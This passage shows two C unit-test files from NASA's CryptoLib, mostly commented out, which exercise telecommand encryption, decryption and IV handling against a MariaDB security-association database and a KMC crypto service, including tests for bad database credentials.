+**경로:** `components/cryptolib/test/kmc/ut_kmc_crypto_with_mtls_sadb.c`
+
+
+```c
+/* Copyright (C) 2009 - 2022 National Aeronautics and Space Administration.
+   All Foreign Rights are Reserved to the U.S. Government.
+
+   This software is provided "as is" without any warranty of any kind, either expressed, implied, or statutory,
+   including, but not limited to, any warranty that the software will conform to specifications, any implied warranties
+   of merchantability, fitness for a particular purpose, and freedom from infringement, and any warranty that the
+   documentation will conform to the program, or any warranty that the software will be error free.
+
+   In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or
+   consequential damages, arising out of, resulting from, or in any way connected with the software or its
+   documentation, whether or not based upon warranty, contract, tort or otherwise, and whether or not loss was sustained
+   from, or arose out of the results of, or use of, the software, documentation or services provided hereunder.
+
+   ITC Team
+   NASA IV&V
+   jstar-development-team@mail.nasa.gov
+*/
+
+/**
+ *  Unit Tests that make use of TC_ApplySecurity/TC_ProcessSecurity function on the data with KMC Crypto Service/MariaDB
+ *Functionality Enabled.
+ **/
+#include "crypto.h"
+#include "crypto_error.h"
+#include "sa_interface.h"
+#include "utest.h"
+
+#include "crypto.h"
+#include "shared_util.h"
+#include <stdio.h>
+#include <mysql/mysql.h>
+
+// #ifdef KMC_MDB_RH
+//     #define CLIENT_CERTIFICATE "/certs/redhat-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/redhat-key.pem"
+// #else
+//     /* KMC_MDB_DB */
+//     #define CLIENT_CERTIFICATE "/certs/debian-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/debian-key.pem"
+// #endif
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_MTLS)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL);
+
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 2, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "20030408000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_TLS)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", NULL); Crypto_Config_Kmc_Crypto_Service("https",
+//     "itc-kmc.nasa.gov", 8443, "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE,
+//     "PEM", CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "20030408000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO, SADB_BAD_USER_NAME)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "bad_user_name", NULL);
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x002C, 2, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_ERROR, status);
+
+//     Crypto_Shutdown();
+// }
+
+// UTEST(KMC_CRYPTO, SADB_BAD_PASSWORD)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("db-itc-kmc.nasa.gov","sadb", 3306,CRYPTO_TRUE,CRYPTO_TRUE, "/certs/ammos-ca-bundle.crt",
+//     NULL, CLIENT_CERTIFICATE, CLIENT_CERTIFICATE_KEY, NULL, "root", "bad_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "itc-kmc.nasa.gov", 8443,
+//     "crypto-service","/certs/ammos-ca-bundle.crt",NULL, CRYPTO_TRUE, CLIENT_CERTIFICATE, "PEM",
+//     CLIENT_CERTIFICATE_KEY, NULL, NULL); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0,
+//     0x0003, 2, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 3, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     ASSERT_EQ(CRYPTO_LIB_ERROR, status);
+
+//     Crypto_Shutdown();
+// }
+
+UTEST_MAIN();
+```
+
+### `ut_mariadb.c`
+
+**경로:** `components/cryptolib/test/kmc/ut_mariadb.c`
+
+
+```c
+/* Copyright (C) 2009 - 2022 National Aeronautics and Space Administration.
+   All Foreign Rights are Reserved to the U.S. Government.
+
+   This software is provided "as is" without any warranty of any kind, either expressed, implied, or statutory,
+   including, but not limited to, any warranty that the software will conform to specifications, any implied warranties
+   of merchantability, fitness for a particular purpose, and freedom from infringement, and any warranty that the
+   documentation will conform to the program, or any warranty that the software will be error free.
+
+   In no event shall NASA be liable for any damages, including, but not limited to direct, indirect, special or
+   consequential damages, arising out of, resulting from, or in any way connected with the software or its
+   documentation, whether or not based upon warranty, contract, tort or otherwise, and whether or not loss was sustained
+   from, or arose out of the results of, or use of, the software, documentation or services provided hereunder.
+
+   ITC Team
+   NASA IV&V
+   jstar-development-team@mail.nasa.gov
+*/
+
+/**
+ *  Unit Tests that make use of Maria DB
+ **/
+#include "ut_mariadb.h"
+#include "crypto_error.h"
+#include "sa_interface.h"
+#include "utest.h"
+
+#include "crypto.h"
+#include "shared_util.h"
+#include <stdio.h>
+
+// #ifdef KMC_MDB_RH
+//     #define CLIENT_CERTIFICATE "/certs/redhat-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/redhat-key.pem"
+// #else
+//     /* KMC_MDB_DB */
+//     #define CLIENT_CERTIFICATE "/certs/debian-cert.pem"
+//     #define CLIENT_CERTIFICATE_KEY "/certs/debian-key.pem"
+// #endif
+
+// void cleanup_sa(SecurityAssociation_t* test_association)
+// {
+//     if (test_association->ek_ref[0] != '\0')
+//         clean_ek_ref(test_association);
+//     if (test_association->ak_ref[0] != '\0')
+//         clean_ak_ref(test_association);
+
+//     free(test_association);
+// }
+
+// void reload_db(void)
+// {
+//     printf("Resetting Database\n");
+//     system("mysql --host=localhost -uroot -pitc123! < ../../src/sa/sa_mariadb_sql/empty_sadb.sql");
+//     system("mysql --host=localhost -uroot -pitc123! <
+//     ../../src/sa/test_sa_mariadb_sql/create_sa_ivv_unit_tests.sql");
+// }
+
+// // Global SQL Connection Parameters
+// // Generic passwords saved in a file = bad ... but this is just for testing
+
+// char* mysql_username = "root";
+// char* mysql_password = "itc123!";
+// char* mysql_hostname = "localhost";
+// char* mysql_database = "sadb";
+// uint16_t mysql_port = 3306; //default port
+// char* ssl_cert = "NONE";
+// char* ssl_key = "NONE";
+// char* ssl_ca = "NONE";
+// char* ssl_capath = "NONE";
+// uint8_t verify_server = 0;
+// char* client_key_password = NULL;
+
+// /**
+//  * @brief Unit Test: Nominal SQL Connection
+//  **/
+// UTEST(MARIA_DB, DB_CONNECT)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     SaInterface sa_if = get_sa_interface_mariadb();
+//     //need the sa call
+//     SecurityAssociation_t* test_sa;
+
+//     status = sa_if->sa_get_from_spi(1, &test_sa);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     ASSERT_EQ(test_sa->iv[11] , 0x01);
+
+//     test_sa->iv[11] = 0xAB;
+//     status = sa_if->sa_save_sa(test_sa);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     status = sa_if->sa_get_from_spi(1, &test_sa);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     ASSERT_EQ(test_sa->iv[11] , 0xAB);
+//     Crypto_Shutdown();
+//     cleanup_sa(test_sa);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption
+//  **/
+// UTEST(MARIA_DB, HAPPY_PATH_ENC)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     char* raw_tc_sdls_ping_h = "20030015000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_mariadb();
+
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     int32_t return_val = CRYPTO_LIB_ERROR;
+
+//     SecurityAssociation_t* test_association;
+
+//     status = sa_if->sa_get_from_spi(2, &test_association);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+//     cleanup_sa(test_association);
+//     status = sa_if->sa_get_from_spi(2, &test_association);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     ASSERT_EQ(test_association->iv[test_association->iv_len - 1], 2);  // Verify that IV incremented.
+
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+//     cleanup_sa(test_association);
+//     Crypto_Shutdown();
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Authorized Encryption
+//  **/
+// UTEST(MARIA_DB, HAPPY_PATH_AUTH_ENC)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     char* raw_tc_sdls_ping_h = "20030415000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+//     int raw_tc_sdls_ping_len = 0;
+//     SaInterface sa_if = get_sa_interface_mariadb();
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     int32_t return_val = CRYPTO_LIB_ERROR;
+
+//     SecurityAssociation_t* test_association;
+//     // Expose the SADB Security Association for test edits.
+//     sa_if->sa_get_from_spi(3, &test_association);
+
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, return_val);
+
+//     cleanup_sa(test_association);
+//     status = sa_if->sa_get_from_spi(3, &test_association);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     ASSERT_EQ(test_association->iv[test_association->iv_len - 1], 2);  // Verify that IV incremented.
+
+//     Crypto_Shutdown();
+//     cleanup_sa(test_association);
+//     free(raw_tc_sdls_ping_b);
+//     free(ptr_enc_frame);
+// }
+
+// /**
+//  * @brief Validation Test: Authorized Decryption
+//  * Makes use of truth data created from the previous AUTH_ENCRYPTION_TEST, to validate that
+//  Crypto_TC_ProcessSecurity( *uint8_t* ingest, int* len_ingest,TC_t* tc_sdls_processed_frame) properly decrypts data
+//  and returns it to the intial *truth data created by the python_auth_encryption(uint8_t* data, uint8_t* key, uint8_t*
+//  iv, uint8_t* header, uint8_t* *bitmask, uint8_t** expected, long* expected_length) function.
+//  **/
+// UTEST(MARIA_DB, AUTH_DECRYPTION_TEST)
+// {
+//     char* dec_test_h =
+//     "20030433000000030000000000000000000000014ED87188D42B3F36130F355E83F3DE9C5E8F716321145159B41144E5514EBBEA"; char*
+//     enc_test_h = "80d2c70008197f0b00310000b1fe"; uint8_t* dec_test_b, *enc_test_b = NULL; int dec_test_len,
+//     enc_test_len = 0; int32_t status = CRYPTO_LIB_ERROR; reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_FALSE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 1, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     SaInterface sa_if = get_sa_interface_mariadb();
+
+//     hex_conversion(dec_test_h, (char**) &dec_test_b, &dec_test_len);
+//     hex_conversion(enc_test_h, (char**) &enc_test_b, &enc_test_len);
+
+//     TC_t* tc_sdls_processed_frame;
+//     tc_sdls_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+//     memset(tc_sdls_processed_frame, 0, (sizeof(uint8_t) * TC_SIZE));
+
+//     SecurityAssociation_t* test_association;
+//     sa_if->sa_get_from_spi(3, &test_association);
+//     test_association->iv[test_association->iv_len - 1] = 0;
+//     sa_if->sa_save_sa(test_association);
+
+//     Crypto_TC_ProcessSecurity(dec_test_b, &dec_test_len, tc_sdls_processed_frame);
+//     for (int i = 0; i < tc_sdls_processed_frame->tc_pdu_len; i++)
+//     {
+//         ASSERT_EQ(enc_test_b[i], tc_sdls_processed_frame->tc_pdu[i]);
+//     }
+
+//     Crypto_Shutdown();
+//     free(dec_test_b);
+//     free(enc_test_b);
+//     free(tc_sdls_processed_frame->tc_sec_header.iv);
+//     free(tc_sdls_processed_frame->tc_sec_header.sn);
+//     free(tc_sdls_processed_frame->tc_sec_header.pad);
+//     free(tc_sdls_processed_frame->tc_sec_trailer.mac); // TODO:  Is there a method to free all of this?
+//     free(tc_sdls_processed_frame);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Authorized Encryption With Partial IV Rollover, increment static IV
+//  **/
+// UTEST(MARIA_DB, HAPPY_PATH_APPLY_NONTRANSMITTED_INCREMENTING_IV_ROLLOVER)
+// {
+//     int32_t status = CRYPTO_LIB_ERROR;
+//     reload_db();
+
+//     status = Crypto_Config_MariaDB(mysql_hostname, mysql_database, mysql_port, CRYPTO_FALSE, verify_server, ssl_ca,
+//                                 ssl_capath, ssl_cert, ssl_key, client_key_password, mysql_username, mysql_password);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     Crypto_Config_CryptoLib(KEY_TYPE_INTERNAL, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_LIBGCRYPT,
+//                         IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_TRUE, TC_HAS_PUS_HDR,
+//                         TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_FALSE, TC_UNIQUE_SA_PER_MAP_ID_TRUE,
+//                         TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 0, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x0003, 2, TC_HAS_FECF, TC_HAS_SEGMENT_HDRS, TC_SIZE);
+
+//     status = Crypto_Init();
+
+//     char* raw_tc_sdls_ping_h = "20030815000080d2c70008197f0b00310000b1fe3128";
+//     char* raw_tc_sdls_ping_b = NULL;
+
+//     char* new_iv_h = "FFFFFFFFFFFC";
+//     char* new_iv_b = NULL;
+
+//     char* expected_iv_h = "000000000001000000000001";
+//     char* expected_iv_b = NULL;
+
+//     int raw_tc_sdls_ping_len = 0;
+//     int new_iv_len = 0;
+//     int expected_iv_len = 0;
+
+//     SaInterface sa_if = get_sa_interface_mariadb();
+//     hex_conversion(raw_tc_sdls_ping_h, &raw_tc_sdls_ping_b, &raw_tc_sdls_ping_len);
+//     hex_conversion(new_iv_h, &new_iv_b, &new_iv_len);
+//     hex_conversion(expected_iv_h, &expected_iv_b, &expected_iv_len);
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     int32_t return_val = CRYPTO_LIB_ERROR;
+
+//     SecurityAssociation_t* test_association;
+
+//     sa_if->sa_get_from_spi(4, &test_association);
+//     return_val =
+//         Crypto_TC_ApplySecurity((uint8_t* )raw_tc_sdls_ping_b, raw_tc_sdls_ping_len, &ptr_enc_frame, &enc_frame_len);
